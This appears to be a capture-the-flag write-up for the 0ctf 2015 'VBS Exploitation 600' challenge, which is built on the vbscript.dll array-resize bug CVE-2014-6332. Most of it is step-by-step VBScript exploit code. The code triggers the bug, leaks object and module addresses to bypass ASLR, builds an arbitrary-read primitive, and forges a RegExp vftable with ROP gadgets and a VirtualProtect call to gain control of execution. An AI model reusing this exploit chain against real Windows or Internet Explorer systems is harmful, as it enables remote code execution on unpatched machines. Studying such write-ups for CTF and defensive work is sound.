## 0ctf2015 VBS Exploitation 600

### Overview

This is a problem made by Promised\_lu and I will give a brief analysis here.
Only team 217 solved it, and because of our mistakes, they finished it in a way
which is not intended.

Actually you got a vbscript shell and Function CreateObject and GetObject are
hooked. The binary itself does not have bugs, and the bug is in vbscript.dll,
which is a famous one CVE-2014-6332. It is known because it can be used in all
version windows and IE to achieve a remote control. The safemode rewritten
trick is also known as DVE.

Acutally we do not wish your guys go into the Godmode, so we do the hooks. But
the function name, CreateObject string is on the heap which can be corrupted
easily. So team 217 used this way and finally went into Godmode again :) I will
share the way which is not relied on DVE, but just take advantage of vbscript
objects.

A basic knowledge of this vbarray bug is required before continuing.

### Exploitation

#### First Part: Trigger the re-sizeing bug

```text
dim a0
dim a1
dim a2
a0 = 5
redim aa(a0)
redim ab(a0)
a3 = 27
a0 = a0 + a3
a1 = a0 + 2
a2 = a0 + &h8000000
redim Preserve aa(a0)
redim ab(a0)
On Error Resume Next:redim Preserve aa(a2)
ab(0) = 1.123456789012345678901234567890
aa(a0) = 10
type1 = VarType(aa(a1))
Print type1
```

if type1 equals to 0x2f66, that means array ab is just next to array aa. We can
use array ab to change the type of aa(a1), to cause a type confusion. That the
main idea of the exploitation next.

#### Second Part: Leak RegExp object address and also vftable address to bypass ASLR

```text
Set regex = New RegExp
ab(0) = 0
Set aa(a1) = regex
ab(0) = 6.36598737437801E-314
regex_addr = aa(a1)
Print "RegExp Obj address: 0x" & hex(regex_addr)

ab(0) = 0
aa(a1) = regex_addr + 4
ab(0) = 1.69759663316747E-313
regex_vftable = lenb(aa(a1))
Print "vftable address: 0x" & hex(regex_vftable)
vbscript_base = regex_vftable - &h17740
Print "vbscript base: 0x" & hex(vbscript_base)
```

type confusion from object to int, and then type confusion from int to String,
use lenb to leak the fisrt item of the RegExp object, which is its vftable.

#### Third Part: Leak shellcode address, create Read32 to do read-what-where and leak kernel32\_base also the VirtualProtect address.

```text
sc = Unescape("%ucccc%ucccc")
ab(0) = 0
aa(a1) = sc
ab(0) = 6.36598737437801E-314
sc_addr = aa(a1)
Print "Shellcode addr: 0x" & hex(sc_addr)

Function D(dword) : hexi = hex(dword) : While len(hexi) < 8 : hexi = "0" & hexi : Wend : D = "%u" & Mid(hexi, 5, 4) & "%u" & Mid(hexi, 1, 4) : End Function

Function Read32(addr) : ab(0) = 0 : aa(a1) = addr + 4 : ab(0) = 1.69759663316747E-313 : Read32 = lenb(aa(a1)) : End Function

kernel32_base = Read32(vbscript_base + &h631ac) - &h2460c 
Print "Kernel32: 0x" & hex(kernel32_base) 
va_addr = Read32(kernel32_base + &h806fc)
Print "Va: 0x" & hex(va_addr)
```

shellcode part: type confusion from String to int, and then for Read32 just use
type confusion from int to String, and use the lenb() trick.

#### Fourth Part: Read out the content of the RegExp object, and make a new one, everything keeps the same, but try to use our faked vftable instead. :)

```text
RegExp_Obj = ""
For i = 0 To 17 : RegExp_Obj = RegExp_Obj & D(Read32(regex_addr + i * 4)) : Next
Print RegExp_Obj

Old_Vftable = ""
For i = 0 To 16 : Old_Vftable = Old_Vftable & D(Read32(regex_vftable + i * 4)) : Next

pivot_p2_ret = kernel32_base + &h205e2
pop7_ret = vbscript_base + &h32f99

new_f = ""
new_f = new_f & D(pivot_p2_ret)
new_f = new_f & Mid(Old_Vftable, 12 + 1, 12)
new_f = new_f & D(pop7_ret)
new_f = new_f & Mid(Old_Vftable, 12 * 3 + 1, 7 * (8 + 4))
new_f = new_f & D(va_addr)
new_f = new_f & D(sc_addr)
new_f = new_f & D(sc_addr)
new_f = new_f & D(&h1000)
new_f = new_f & D(&h1000)
new_f = new_f & D(&h40)

new_f = Unescape(new_f)
ab(0) = 0
aa(a1) = new_f
ab(0) = 6.36598737437801E-314
new_f_addr = aa(a1)
Print "New Vftable: 0x" & hex(new_f_addr)

new_obj = ""
new_obj = new_obj & D(new_f_addr)
new_obj = new_obj & Mid(RegExp_Obj, 13, 18 * 12 - 12)
new_obj = Unescape(new_obj)
ab(0) = 0
aa(a1) = new_obj
ab(0) = 6.36598737437801E-314
new_obj_addr = aa(a1)
Print "New Obj: 0x" & hex(new_obj_addr)
ab(0) = 1.9097962123134E-313
```

Notice finally there is a type confusion from String to Object to make the
vbscript.dll convinced that our faked String(RegExp) is an Object.

At last,

```text
Print aa(a1).Pattern
```

This will call the method of RegExp, get\_pattern, and then eip controlled. ;-)

Actually you can do full ROP, open C:\flag.txt, read the content and then print
out without shellcode.

### Conclusion

Must say that 217 solution is better and do not need much time. I just show the
intended way haha. Thanks to promised\_lu for this problem, thanks to all the
teams and players taking part in this year 0ctf. See you next year. XD

memeda@0ops
